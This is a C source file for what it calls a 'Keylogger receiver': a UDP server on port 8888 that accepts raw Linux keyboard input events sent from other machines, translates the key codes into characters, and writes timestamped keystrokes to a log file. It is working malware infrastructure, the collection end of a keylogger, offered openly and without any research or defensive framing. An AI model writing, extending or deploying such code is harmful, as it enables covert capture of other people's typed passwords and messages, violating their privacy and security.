#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/input.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>

#define PORT 8888
#define MAX_PAYLOAD 1024

static volatile int keep_running = 1;

void intHandler(int dummy) {
    keep_running = 0;
}

const char* get_key_name(int code) {
    static char unknown[16];
    
    switch (code) {
        case KEY_ESC: return "ESC";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_BACKSPACE: return "[Backspace]";
        case KEY_TAB: return "[Tab]";
        case KEY_Q: return "q";
        case KEY_W: return "w";
        case KEY_E: return "e";
        case KEY_R: return "r";
        case KEY_T: return "t";
        case KEY_Y: return "y";
        case KEY_U: return "u";
        case KEY_I: return "i";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_ENTER: return "[Enter]";
        case KEY_LEFTCTRL: return "[Ctrl]";
        case KEY_A: return "a";
        case KEY_S: return "s";
        case KEY_D: return "d";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_GRAVE: return "`";
        case KEY_LEFTSHIFT: return "[Shift]";
        case KEY_BACKSLASH: return "\\";
        case KEY_Z: return "z";
        case KEY_X: return "x";
        case KEY_C: return "c";
        case KEY_V: return "v";
        case KEY_B: return "b";
        case KEY_N: return "n";
        case KEY_M: return "m";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";
        case KEY_RIGHTSHIFT: return "[Shift]";
        case KEY_KPASTERISK: return "*";
        case KEY_LEFTALT: return "[Alt]";
        case KEY_SPACE: return " ";
        case KEY_CAPSLOCK: return "[CapsLock]";
        case KEY_F1: return "[F1]";
        case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]";
        case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]";
        case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]";
        case KEY_F11: return "[F11]";
        case KEY_F12: return "[F12]";
        default:
            snprintf(unknown, sizeof(unknown), "[%d]", code);
            return unknown;
    }
}

void log_to_file(const char* key, FILE* logfile) {
    time_t now;
    struct tm *tm_info;
    char timestamp[26];

    time(&now);
    tm_info = localtime(&now);
    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(logfile, "[%s] %s\n", timestamp, key);
    fflush(logfile);
}

int main(int argc, char *argv[]) {
    struct sockaddr_in server_addr;
    int sock_fd;
    char buffer[MAX_PAYLOAD];
    FILE *logfile;
    char *logpath = "keylog.txt";

    if (argc > 1) {
        logpath = argv[1];
    }

    logfile = fopen(logpath, "a");
    if (!logfile) {
        fprintf(stderr, "Error opening log file: %s\n", strerror(errno));
        return 1;
    }

    signal(SIGINT, intHandler);

    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_fd < 0) {
        fprintf(stderr, "Socket creation failed: %s\n", strerror(errno));
        fclose(logfile);
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Bind failed: %s\n", strerror(errno));
        close(sock_fd);
        fclose(logfile);
        return 1;
    }

    printf("Keylogger receiver started. Logging to: %s\n", logpath);
    fprintf(logfile, "\n--- Session started at %s ---\n", 
            asctime(localtime(&(time_t){time(NULL)})));

    while (keep_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        ssize_t n = recvfrom(sock_fd, buffer, MAX_PAYLOAD, 0,
                            (struct sockaddr *)&client_addr, &client_len);
        
        if (n < 0) {
            fprintf(stderr, "Error receiving data: %s\n", strerror(errno));
            break; // Exit the loop on error
        }

        if (n > 0) {
            struct input_event *ev = (struct input_event *)buffer;
            if (ev->type == EV_KEY && ev->value == 1) {
                const char* key_name = get_key_name(ev->code);
                log_to_file(key_name, logfile);
                printf("Logged: %s\n", key_name);
            }
        }
    }

    printf("Shutting down...\n");
    fprintf(logfile, "\n--- Session ended at %s ---\n", 
            asctime(localtime(&(time_t){time(NULL)})));

    fclose(logfile);
    close(sock_fd);

    return 0;
}